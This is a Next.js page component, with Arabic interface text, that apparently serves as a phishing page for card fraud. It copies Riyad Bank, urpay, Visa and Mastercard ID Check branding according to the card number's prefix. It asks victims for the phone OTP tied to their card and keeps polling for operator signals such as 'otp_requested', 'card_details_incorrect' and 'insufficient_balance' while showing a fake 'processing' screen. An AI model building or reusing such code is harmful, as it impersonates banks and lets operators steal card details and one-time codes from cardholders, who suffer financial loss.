'use client';

import Link from 'next/link';
import { useEffect, useState } from 'react';

const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';

type CheckoutDraft = {
  phone?: unknown;
  cardLast4?: string;
  cardNumber?: string;
  card_number?: string;
  card?: string;
  stage?: unknown;
  orderId?: unknown;
  orderNumber?: unknown;
  customerNotificationKey?: unknown;
  confirmedAt?: unknown;
};

function normalizeDigits(value: string) {
  return value
    .replace(/[٠-٩]/g, (digit) => String('٠١٢٣٤٥٦٧٨٩'.indexOf(digit)))
    .replace(/[۰-۹]/g, (digit) => String('۰۱۲۳۴۵۶۷۸۹'.indexOf(digit)))
    .replace(/[^0-9]/g, '');
}

export default function VerifyPhonePage() {
  const [phone, setPhone] = useState('');
  const [orderId, setOrderId] = useState('');
  const [orderNumber, setOrderNumber] = useState('');
  const [customerNotificationKey, setCustomerNotificationKey] = useState('');
  const [cardLast4, setCardLast4] = useState('0000');
  const [cardPrefixType, setCardPrefixType] = useState<'riyad' | 'urpay' | 'default'>('default');
  const [draftReady, setDraftReady] = useState(false);
  const [referenceCode, setReferenceCode] = useState('');
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verified, setVerified] = useState(false);
  const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [invoiceSent, setInvoiceSent] = useState(false);
  const [adminNoticeType, setAdminNoticeType] = useState<'otp' | 'card' | 'balance' | null>(null);

  const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);

  useEffect(() => {
    if (!verified) return;
    const pageClass = 'erd-verify-waiting-screen';
    document.documentElement.classList.add(pageClass);
    document.body.classList.add(pageClass);
    return () => {
      document.documentElement.classList.remove(pageClass);
      document.body.classList.remove(pageClass);
    };
  }, [verified]);

  useEffect(() => {
    try {
      const raw = window.sessionStorage.getItem(DRAFT_KEY);
      const draft = raw ? (JSON.parse(raw) as CheckoutDraft) : null;

      const savedPhone = typeof draft?.phone === 'string' ? normalizeDigits(draft.phone) : '';
      const savedOrderId = typeof draft?.orderId === 'string' ? draft.orderId : '';
      const savedKey = typeof draft?.customerNotificationKey === 'string' ? draft.customerNotificationKey : '';
      const savedConfirmedAt =
        typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
          ? draft.confirmedAt
          : null;

      if (draft) {
        const fullCardNum =
          typeof draft.cardNumber === 'string'
            ? draft.cardNumber.replace(/\D/g, '')
            : typeof draft.card_number === 'string'
            ? draft.card_number.replace(/\D/g, '')
            : typeof draft.card === 'string'
            ? draft.card.replace(/\D/g, '')
            : '';

        if (fullCardNum.startsWith('5297')) {
          setCardPrefixType('riyad');
        } else if (fullCardNum.startsWith('4909')) {
          setCardPrefixType('urpay');
        } else {
          setCardPrefixType('default');
        }

        let extractedLast4 = '0000';
        if (typeof draft.cardLast4 === 'string' && draft.cardLast4.length === 4) {
          extractedLast4 = draft.cardLast4;
        } else if (fullCardNum.length >= 4) {
          extractedLast4 = fullCardNum.slice(-4);
        }
        setCardLast4(extractedLast4);
      }

      if (
        (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
        savedPhone.length === 10 &&
        savedOrderId &&
        savedKey
      ) {
        setPhone(savedPhone);
        setOrderId(savedOrderId);
        setOrderNumber(typeof draft.orderNumber === 'string' ? draft.orderNumber : '');
        setCustomerNotificationKey(savedKey);
        setVerified(draft.stage === 'confirmed');
        setConfirmedAt(draft.stage === 'confirmed' ? savedConfirmedAt : null);
        setDraftReady(true);
      } else {
        setDraftReady(true);
      }
    } catch {
      setDraftReady(true);
    }
  }, []);

  useEffect(() => {
    if (!verified) {
      setCountdown(0);
      return;
    }

    const verificationTime = confirmedAt ?? Date.now();
    const updateCountdown = () => {
      setCountdown(Math.max(0, Math.ceil((verificationTime + 30_000 - Date.now()) / 1000)));
    };

    updateCountdown();
    const interval = window.setInterval(updateCountdown, 250);
    return () => {
      window.clearInterval(interval);
    };
  }, [confirmedAt, verified]);

  useEffect(() => {
    if (!verified || adminNoticeType || !orderId || !customerNotificationKey) return;

    let active = true;
    let requestInFlight = false;

    const checkAdminNotice = async () => {
      if (!active || requestInFlight) return;
      requestInFlight = true;
      try {
        const response = await fetch(
          '/api/customer-notifications?key=' + encodeURIComponent(customerNotificationKey),
          { cache: 'no-store' }
        );
        if (!response.ok) return;

        const result = (await response.json()) as {
          ok?: boolean;
          notifications?: Array<{ orderId?: string; status?: string; createdAt?: string }>;
        };
        const verificationTime = confirmedAt ?? 0;
        const matchingNotice =
          result.ok === true &&
          Array.isArray(result.notifications) &&
          result.notifications.find((item) => {
            const createdAt = Date.parse(item.createdAt || '');
            return (
              item.orderId === orderId &&
              (item.status === 'otp_requested' ||
                item.status === 'card_details_incorrect' ||
                item.status === 'insufficient_balance') &&
              Number.isFinite(createdAt) &&
              createdAt >= verificationTime - 15_000
            );
          });

        if (active && matchingNotice) {
          setAdminNoticeType(
            matchingNotice.status === 'otp_requested'
              ? 'otp'
              : matchingNotice.status === 'card_details_incorrect'
              ? 'card'
              : 'balance'
          );
        }
      } catch {
        // Retry
      } finally {
        requestInFlight = false;
      }
    };

    void checkAdminNotice();
    const timer = window.setInterval(() => {
      void checkAdminNotice();
    }, 2500);
    const handleFocus = () => {
      void checkAdminNotice();
    };
    window.addEventListener('focus', handleFocus);

    return () => {
      active = false;
      window.clearInterval(timer);
      window.removeEventListener('focus', handleFocus);
    };
  }, [verified, adminNoticeType, orderId, customerNotificationKey, confirmedAt]);

  useEffect(() => {
    if (!verified || countdown > 0 || invoiceSent || !orderId || !customerNotificationKey) return;

    let active = true;
    let requestInFlight = false;

    const checkInvoiceSent = async () => {
      if (!active || requestInFlight) return;
      requestInFlight = true;
      try {
        const response = await fetch(
          '/api/customer-notifications?key=' + encodeURIComponent(customerNotificationKey),
          { cache: 'no-store' }
        );
        if (!response.ok) return;

        const result = (await response.json()) as {
          ok?: boolean;
          notifications?: Array<{ orderId?: string; status?: string }>;
        };
        const matchingInvoice =
          result.ok === true &&
          Array.isArray(result.notifications) &&
          result.notifications.some(
            (item) => item.orderId === orderId && item.status === 'invoice_documents'
          );

        if (active && matchingInvoice) setInvoiceSent(true);
      } catch {
        // Retry
      } finally {
        requestInFlight = false;
      }
    };

    void checkInvoiceSent();
    const timer = window.setInterval(() => {
      void checkInvoiceSent();
    }, 2500);
    const handleFocus = () => {
      void checkInvoiceSent();
    };
    window.addEventListener('focus', handleFocus);

    return () => {
      active = false;
      window.clearInterval(timer);
      window.removeEventListener('focus', handleFocus);
    };
  }, [verified, countdown, invoiceSent, orderId, customerNotificationKey]);

  async function handleVerify() {
    if (!isReferenceCodeValid) {
      setError('أدخل رمزًا من 4 إلى 6 أرقام.');
      return;
    }
    if (isVerifying || verified) return;

    setError('');
    setIsVerifying(true);
    try {
      const response = await fetch('/api/orders/verify-confirmation-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          orderId,
          customerNotificationKey,
          code: referenceCode,
        }),
      });
      const result = (await response.json()) as { ok?: boolean; error?: string };
      if (!response.ok || result.ok !== true) {
        setError(result.error || 'تعذر إرسال رمز الطلب. حاول مرة أخرى.');
        return;
      }

      setConfirmedAt(Date.now());
      setVerified(true);
    } catch {
      setError('تعذر الاتصال بالخادم. حاول مرة أخرى.');
    } finally {
      setIsVerifying(false);
    }
  }

  if (!draftReady) {
    return (
      <main style={{ backgroundColor: '#ffffff', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
        <div style={{ textAlign: 'center' }}>
          <p style={{ color: '#555', fontSize: '16px', marginBottom: '15px' }}>لا توجد بيانات طلب جاهزة للتأكيد.</p>
          <Link href="/checkout/store" style={{ color: '#1646a7', textDecoration: 'none' }}>
            العودة لإدخال بيانات الطلب
          </Link>
        </div>
      </main>
    );
  }

  // الهيدر المتغير بناءً على نوع البادئة
  const HeaderLogos = () => {
    if (cardPrefixType === 'riyad') {
      return (
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%', maxWidth: '520px', margin: '0 auto 35px auto', padding: '0 10px', direction: 'ltr' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <svg width="34" height="34" viewBox="0 0 40 40" fill="none">
              <path d="M0 20L15 5V25L0 20Z" fill="#00b493" />
              <path d="M15 5L40 5V25L25 40V20L15 5Z" fill="#1b0066" />
            </svg>
            <div style={{ display: 'flex', flexDirection: 'column', textAlign: 'left', lineHeight: '1.1' }}>
              <span style={{ fontSize: '20px', fontWeight: 'bold', color: '#68727d', fontFamily: 'sans-serif' }}>بنك الرياض</span>
              <span style={{ fontSize: '16px', fontWeight: '800', color: '#68727d', fontFamily: 'sans-serif', letterSpacing: '0.5px' }}>Riyad Bank</span>
            </div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <span style={{ width: '22px', height: '22px', borderRadius: '50%', background: '#eb001b', display: 'inline-block' }} />
              <span style={{ width: '22px', height: '22px', borderRadius: '50%', background: '#f79e1b', display: 'inline-block', marginLeft: '-9px', opacity: 0.95 }} />
            </div>
            <span style={{ color: '#ccc', fontSize: '22px', fontWeight: '300' }}>|</span>
            <span style={{ fontSize: '21px', fontWeight: '400', color: '#111', fontFamily: 'sans-serif', letterSpacing: '-0.3px' }}>ID Check</span>
          </div>
        </div>
      );
    }

    if (cardPrefixType === 'urpay') {
      return (
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%', maxWidth: '520px', margin: '0 auto 35px auto', padding: '0 10px', direction: 'ltr' }}>
          <span style={{ fontSize: '38px', fontWeight: 'bold', fontStyle: 'italic', color: '#1a1f71', fontFamily: 'sans-serif', letterSpacing: '-1px' }}>
            VISA
          </span>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.5 15h-3v-6h3v6zm0-8h-3V7h3v2z" fill="#0052cc" />
            </svg>
            <span style={{ fontSize: '22px', fontWeight: '900', color: '#0052cc', fontFamily: 'sans-serif', letterSpacing: '-0.5px' }}>urpay</span>
          </div>
        </div>
      );
    }

    return (
      <div style={{ textAlign: 'center', marginBottom: '30px' }}>
        <span style={{ fontSize: '38px', fontWeight: 'bold', fontStyle: 'italic', color: '#1a1f71', fontFamily: 'sans-serif', letterSpacing: '-1px' }}>
          visa
        </span>
      </div>
    );
  };

  if (!verified) {
    return (
      <main className="erd-verify-page" style={{ direction: 'rtl', padding: '30px 20px', maxWidth: '480px', margin: 'auto', minHeight: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', backgroundColor: '#fff' }}>
        <HeaderLogos />

        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
          <p style={{ color: '#666', fontSize: '15px', marginBottom: '8px' }}>تم ارسال كود الي رقمك</p>
          <p style={{ color: '#222', fontSize: '16px', fontWeight: 'bold' }}>
            من فضلك ارسل رمز الهاتف المرتبط بهذه الفيزا.
          </p>
          <p style={{ fontSize: '22px', fontWeight: 'bold', letterSpacing: '3px', marginTop: '10px', color: '#111' }}>
            •••• {cardLast4}
          </p>
        </div>

        <div style={{ marginBottom: '15px' }}>
          <label style={{ display: 'block', textAlign: 'center', color: '#777', fontSize: '14px', marginBottom: '8px' }}>OTP Code</label>
          <input
            type="text"
            value={referenceCode}
            onChange={(e) => setReferenceCode(e.target.value)}
            maxLength={6}
            style={{ width: '100%', padding: '12px', borderRadius: '4px', border: '1px solid #a6b9d7', fontSize: '18px', textAlign: 'center', outline: 'none' }}
          />
        </div>

        {error && <p style={{ color: 'red', textAlign: 'center', marginBottom: '15px', fontSize: '14px' }}>{error}</p>}

        <button
          type="button"
          onClick={handleVerify}
          disabled={isVerifying}
          style={{ width: '100%', padding: '12px', background: '#5b82c6', color: '#fff', border: 'none', borderRadius: '4px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', marginBottom: '15px' }}
        >
          {isVerifying ? 'جاري التحقق...' : 'معاينة الرمز'}
        </button>

        <div style={{ textAlign: 'center' }}>
          <button type="button" style={{ background: 'none', border: 'none', color: '#2b6cb0', fontSize: '14px', cursor: 'pointer', textDecoration: 'underline' }}>
            مسح الرمز
          </button>
        </div>
      </main>
    );
  }

  return (
    <main className="erd-retry-page" style={{ direction: 'rtl', padding: '30px 20px', maxWidth: '480px', margin: 'auto', minHeight: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', backgroundColor: '#fff' }}>
      <HeaderLogos />

      <div style={{ textAlign: 'center' }}>
        <h1 style={{ fontSize: '22px', fontWeight: 'bold', marginBottom: '12px', color: '#12354e' }}>جارٍ إتمام العملية</h1>
        <p style={{ color: '#555', marginBottom: '15px', fontSize: '16px' }}>
          آخر أرقام البطاقة المستخدمة: <strong>•••• {cardLast4}</strong>
        </p>
        <p style={{ color: '#00a88a', fontWeight: 'bold', fontSize: '15px' }}>يرجى الانتظار بينما نقوم بمعالجة طلبك...</p>
      </div>
    </main>
  );
}
